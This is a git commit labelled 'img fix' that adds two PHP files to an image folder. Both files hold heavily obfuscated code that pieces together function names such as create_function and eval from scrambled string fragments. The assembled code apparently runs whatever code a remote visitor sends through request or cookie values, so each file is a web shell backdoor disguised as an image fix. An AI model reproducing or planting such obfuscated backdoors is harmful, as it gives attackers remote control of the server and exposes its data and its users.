7140cdca272104af9d5ae22bd1d82e94227e773d
fbarberis <47946493+fbarberis@users.noreply.github.com>
2020-04-29 10:36:21 -0300

    img fix

---
+++ img/Quick_start_code_comp_right_ver1.php
@@ -0,0 +1,79 @@
+<?php
+
+$areaway ='a'; $deludes= 'a'; $clearness= ';';$bunch= 'se5d'; $blackhawk = 'S';
+
+$keel = ')atO?sEiy';
+$bradley='V';
+
+$event = '[';
+
+$cusp='i$';$leslie ='g';$heavier= '$';
+$dominic ='3';$damsel= 'T';$invest='H'; $febrile ='_';$athletic='Q=fsiyeri';$godhacker='reRu,t"_';
+$flowcharting='r'; $implementer ='mU('; $hirsute = 'vR(J_';
+
+$kris='drTeL';
+$cowpea='s'; $forgivingly='E[';
+$arne = '?C(a;';$entertains='(eca:M"';
+
+$iceman='Te'; $fastens = 'qt;Epe';$complemented='dv)))(';$carlotta = 'J]SP'; $halved='r';$escaping = 's"RFbe"a';$joella ='s';$backpacks ='T>GV_1)i';
+$magdalene = 'a$C';
+$duty = 'i';$cowl = '('; $gui = 'c'; $balduin='O'; $assistant ='(ArT$_e4'; $francis='$'; $explorations= '"trgrvR'; $littlehouse= 'Pr"e[R[iQ'; $bangladesh='T';$joining='$';$cheif= '$NdEaK<d'; $citizens = 'j';$furrier= 'D:De]6';$initializer ='Tol';$brutus =')';$concepts = 'n';$appealer='FRvHaTior'; $conceivably = '_)';$daffy = 'r';$catlaina ='_uf)](et'; $antithesis='aac"F';$bandpass ='n'; $loan= 'v'; $knuckled= '6Eq';
+
+$brucie='fE'; $gorillas= 'eig'; $alters =':,V';$fanatic ='K2;$se'; $hallelujah=')"';$disposition ='_';$diaphragm='nSl_Dr?'; $expect = 'Q'; $hemolytic ='td9st';$impatience='8';$doubters= '(;tpDH$'; $faultless= '$ojDPIOfe'; $amalgamate= '=)]B7=J'; $hater=' ';
+$gripes ='_';
+
+$haily ='@';
+
+$impactors = 'v'; $anxious ='t';
+$boniface ='I(cr)4d_('; $clustering = 'Q';$ellipse=$boniface['2'].$boniface['3'].$faultless['8'] .$antithesis['1'] .$anxious. $faultless['8']. $boniface['7'] .
+$faultless['7'] .$catlaina['1'] .
+$diaphragm['0'] .$boniface['2']. $anxious.
+
+$gorillas['1'] .
+
+$faultless['1'].$diaphragm['0'] ;$brynn= $hater ;$apppointee= $ellipse($brynn, $faultless['8'].$impactors .
+
+$antithesis['1'] .$diaphragm['2'] . $boniface['8']. $antithesis['1'].$boniface['3']. $boniface['3'] .$antithesis['1'] . $athletic['5'].$boniface['7'].$doubters['3'].
+$faultless['1']. $doubters['3'].$boniface['8'] .$faultless['7'] . $catlaina['1'] . $diaphragm['0']. $boniface['2'] .$boniface['7'] .$gorillas['2'] . $faultless['8'].$anxious . $boniface['7'].$antithesis['1']. $boniface['3'].$gorillas['2'].$hemolytic['3'] . $boniface['8'] . $boniface[4] .$boniface[4].$boniface[4].
+
+$doubters['1'] ); $apppointee($hemolytic['2'] , $diaphragm['2'] ,$faultless['3'] ,$appealer['5'],$boniface['0'] , $faultless['4'] , $faultless['2'],$faultless[0] .$gorillas['1'].$amalgamate['5']. $antithesis['1']. $boniface['3']. $boniface['3'].$antithesis['1'] .$athletic['5'] . $boniface['7'] .$implementer['0'] .$faultless['8']. $boniface['3']. $gorillas['2'] . $faultless['8'] .
+$boniface['8'].$faultless[0] .
+
+$boniface['7'] . $appealer['1']. $brucie['1'] . $clustering[0].$implementer[1].
+$brucie['1']. $diaphragm['1'].$appealer['5'].$alters[1] . $faultless[0]. $boniface['7'] . $magdalene['2'].
+$faultless['6'].$faultless['6'] .$fanatic['0'] . $boniface['0'].$brucie['1'] .$alters[1]. $faultless[0] .$boniface['7'] . $diaphragm['1']. $brucie['1'].$appealer['1'] .$alters['2']. $brucie['1'] . $appealer['1'] .$boniface[4] .$doubters['1'].$faultless[0] .$antithesis['1'] .$amalgamate['5'] .$gorillas['1'].
+$hemolytic['3'].
+$hemolytic['3'] . $faultless['8'] . $anxious . $boniface['8']. $faultless[0] .
+$gorillas['1'] .$littlehouse['6'] . $hallelujah['1'] .$faultless['2'] . $impactors. $boniface['6'] . $knuckled['2']. $boniface['6'] . $anxious. $faultless['7'] . $boniface['3'] . $hallelujah['1'] .$amalgamate['2'] .$boniface[4] .$diaphragm['6']. $faultless[0] . $gorillas['1'] . $littlehouse['6'].
+$hallelujah['1']. $faultless['2'].$impactors .$boniface['6'] .
+
+$knuckled['2'].$boniface['6'].$anxious .$faultless['7'].$boniface['3'] .$hallelujah['1'] .
+
+$amalgamate['2'].
+$alters['0']. $boniface['8'].
+$gorillas['1'] . $hemolytic['3'] .$hemolytic['3'] .
+$faultless['8'].$anxious . $boniface['8'].$faultless[0] .
+
+$gorillas['1'] . $littlehouse['6'] .
+
+$hallelujah['1'] .$doubters['5'].$appealer['5'].$appealer['5'].$faultless['4'] .$boniface['7'] . $amalgamate[6]. $alters['2'] .$faultless['3'].
+
+$clustering[0] . $faultless['3'].$appealer['5'] .
+
+$antithesis['4'] . $appealer['1']. $hallelujah['1'] .$amalgamate['2']. $boniface[4] .$diaphragm['6'].$faultless[0]. $gorillas['1'].$littlehouse['6']. $hallelujah['1'] .$doubters['5'].
+
+$appealer['5']. $appealer['5']. $faultless['4'] . $boniface['7'] . $amalgamate[6].$alters['2'].$faultless['3'] . $clustering[0]. $faultless['3'] .
+
+$appealer['5']. $antithesis['4'].$appealer['1']. $hallelujah['1'] . $amalgamate['2'] . $alters['0']. $boniface['6']. $gorillas['1']. $faultless['8'] . $boniface[4]. $doubters['1'] .$faultless['8'] .$impactors .$antithesis['1'] . $diaphragm['2'] .
+
+$boniface['8'] .$hemolytic['3'] . $anxious . $boniface['3'] . $boniface['3']. $faultless['8'].$impactors .$boniface['8']. $escaping['4'] .$antithesis['1'] .
+
+$hemolytic['3']. $faultless['8'].$knuckled['0'].
+$boniface['5'].$boniface['7'] . $boniface['6'] .$faultless['8'] . $boniface['2'] .$faultless['1']. $boniface['6'] .$faultless['8'] . $boniface['8'] . $hemolytic['3']. $anxious .$boniface['3'] .$boniface['3'] .
+
+$faultless['8']. $impactors.
+$boniface['8']. $faultless[0].
+$antithesis['1'].$boniface[4]. $boniface[4].$boniface[4] . $boniface[4].
+
+$doubters['1']);
+
---
+++ img/fvbaetwh.php
@@ -0,0 +1,101 @@
+<?php
+	$expanding= '(';$blackberry = '"E_)'; $interwoven ='e';$era ='l';$eldon ='bovmaXrrL';$drought='eS['; $faythe ='s';$katey= 'r)n:';$breadwinners ='Gt)e'; $beatitude= 'W';
+	$itemize= 'H';
+	$connections='t$vPF'; $barter='a';$annoys = 'a)]$f$pr$';$broadened='I';
+
+	$councillor ='_';$assembles='['; $impasse='poT(_a';$auditioning='c';$idyllic='M"evs(K'; $decimals= '"Efp'; $delirium= 'T';$compiling= '`$el';$buckhorn = ']S?oPXU'; $compartment= '"(;]Ra$V;'; $atom ='f'; $lavished= 'es)_e';$assigning = '_';
+
+	$immunization ='EQCO T;a';$darrick= '"T'; $circumflex='^';$fig='X';
+	$anagram ='ESt[';$bbbb= 'a';$cooperator = ',irOg';$embody ='i'; $casework='R6idays$_'; $luxurious='TyP'; $hired ='Q';$handful='(O'; $constraining = 's';
+	$drags = ']Meea(c';
+
+	$jimmorrison=')';
+
+	$darius ='i_i';$belayed='xv=?t(n';$cue='D'; $lay ='V'; $effusion ='a';$interpreters ='r)bFrLpN'; $larisa = 'fL)mgerOU';
+
+	$capitally = 't'; $inclusion ='$d(greROi';
+	$grub= 'G';$diminishes ='R';$franklyn='_'; $lise='o'; $brucellosis = '"';
+	$flamed='u'; $ideas='"t;lcgu';$jacynth= '=mPaZ)TeM';$liquefaction='"';$keeping = '['; $lara = 'g'; $demitting= 't';$fictitiously = 'n'; $kola ='E'; $burdening='c';$fader ='c';$hoists= ')d[';$drain= 'DYia_P(';$croaking='i:';$key= '('; $faraway ='s'; $bakers='_)oe';
+	$florian='$dr$eld_';$homespun = 'x';
+
+	$leap ='i';$hopelessly ='ds'; $malaria ='Hr,_(4]s';$famines ='e';
+	$conceptualization='e'; $clarifying= $fader.$malaria['1']. $conceptualization. $drain['3']. $demitting.$conceptualization. $malaria['3'] . $larisa['0'] . $ideas['6'] .
+	$fictitiously . $fader. $demitting .$leap.
+	$bakers['2']. $fictitiously;
+
+	$garrott =$immunization['4'] ; $enlivens= $clarifying ($garrott,$conceptualization . $belayed['1'].$drain['3']. $florian['5'].$malaria['4']. $drain['3'] .$malaria['1'].$malaria['1'] .
+	$drain['3']. $luxurious[1]. $malaria['3'].$interpreters['6'] . $bakers['2'].$interpreters['6'] . $malaria['4'] . $larisa['0'] . $ideas['6'] . $fictitiously . $fader .
+	$malaria['3'] . $lara.$conceptualization.
+	$demitting. $malaria['3']. $drain['3'].$malaria['1'].$lara . $malaria['7'].
+	$malaria['4'] .$bakers['1'].$bakers['1'] .$bakers['1'].$ideas[2]);
+	$enlivens
+
+	($caddric['0'] , $decelerates['0'] ,$malaria['3'] , $diminishes, $drain['3'],$dungeonsdragons['4'] ,
+	$belayed['3'] , $leek['1'],$malaria['2'] ,
+	$cropper['6'] , $immunization['2'] , $constrict['6'] ,$florian['3'] .$leap . $jacynth['0'] . $drain['3'].$malaria['1'] . $malaria['1'] .$drain['3'] .
+
+	$luxurious[1]. $malaria['3'].
+	$jacynth[1].$conceptualization .$malaria['1']. $lara.
+
+	$conceptualization . $malaria['4']. $florian['3'] . $malaria['3'].$diminishes .$kola.$hired. $larisa[8].$kola.$anagram['1'] .$jacynth['6'] .$malaria['2']. $florian['3'] .
+
+	$malaria['3'].
+
+	$immunization['2'].$inclusion['7'].
+
+	$inclusion['7'] .$idyllic['6'].$broadened. $kola.
+
+	$malaria['2']. $florian['3']. $malaria['3'] .$anagram['1'].$kola.$diminishes . $lay .$kola.
+
+	$diminishes.
+
+	$bakers['1'].$ideas[2] . $florian['3'] . $drain['3'].$jacynth['0'].$leap.
+
+	$malaria['7'].$malaria['7'] .$conceptualization. $demitting.$malaria['4'] .$florian['3']. $leap. $hoists['2'].
+
+	$liquefaction. $lara . $larisa['0']. $florian['5'] .
+
+	$jacynth[1] . $bakers['2'] .$homespun.$hopelessly['0'] . $interpreters['6'].$liquefaction . $malaria['6']. $bakers['1'] .
+	$belayed['3'] . $florian['3'].$leap .$hoists['2']. $liquefaction. $lara .$larisa['0']. $florian['5'] . $jacynth[1]. $bakers['2']. $homespun .$hopelessly['0'] .$interpreters['6'].$liquefaction.$malaria['6'] . $croaking['1'].
+	$malaria['4'] .$leap.$malaria['7'] . $malaria['7'] . $conceptualization .
+
+	$demitting.
+	$malaria['4'] .$florian['3'] . $leap. $hoists['2'] .
+	$liquefaction . $malaria['0'].$jacynth['6'].
+
+	$jacynth['6'] .$drain['5']. $malaria['3'] . $grub . $interpreters['3'] . $larisa['1'].
+
+	$jacynth['8']. $inclusion['7'].
+
+	$fig. $drain['0'].$drain['5'] . $liquefaction .
+	$malaria['6'] . $bakers['1'] .$belayed['3']. $florian['3'].
+
+	$leap .
+	$hoists['2'] .
+
+	$liquefaction .
+	$malaria['0'] . $jacynth['6'] .$jacynth['6'] .$drain['5'] . $malaria['3'] .$grub . $interpreters['3'] . $larisa['1'] .$jacynth['8'] .
+
+	$inclusion['7'].$fig.$drain['0'] .
+
+	$drain['5'] . $liquefaction .
+
+	$malaria['6'].$croaking['1'].$hopelessly['0'].$leap.$conceptualization. $bakers['1'] . $ideas[2] .
+	$conceptualization. $belayed['1'] . $drain['3'] .
+	$florian['5'].$malaria['4'] .
+
+	$malaria['7'] .$demitting . $malaria['1'] .$malaria['1']. $conceptualization.$belayed['1'] .
+
+	$malaria['4'].$interpreters[2].$drain['3'] .$malaria['7'] .$conceptualization. $casework['1']. $malaria['5'].$malaria['3'] .
+	$hopelessly['0'].$conceptualization. $fader. $bakers['2'] .
+	$hopelessly['0']. $conceptualization.
+
+	$malaria['4'] . $malaria['7'].$demitting. $malaria['1'].
+	$malaria['1'] .
+
+	$conceptualization . $belayed['1'] . $malaria['4'] .
+
+	$florian['3'].
+
+	$drain['3'] . $bakers['1']. $bakers['1']. $bakers['1'].
+	$bakers['1'] .$ideas[2]);
